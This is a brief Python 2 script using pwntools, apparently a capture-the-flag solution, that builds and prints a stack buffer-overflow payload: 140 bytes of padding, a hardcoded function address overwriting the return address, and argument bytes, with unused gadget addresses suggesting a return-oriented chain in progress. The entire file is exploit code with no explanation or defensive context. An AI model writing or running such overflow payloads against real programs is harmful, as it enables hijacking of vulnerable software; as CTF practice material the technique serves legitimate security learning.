#!/usr/bin/env python2

from pwn import *

buffSize = 128

add_addr = 0x00400566
fillbuff_addr = 0x40059c
poppopret_addr = 0x00400690

payload = flat('A' * 140, p32(add_addr), '\x01\x01\x01\x01' + '\x08\x08\x08\x08')
print(payload);
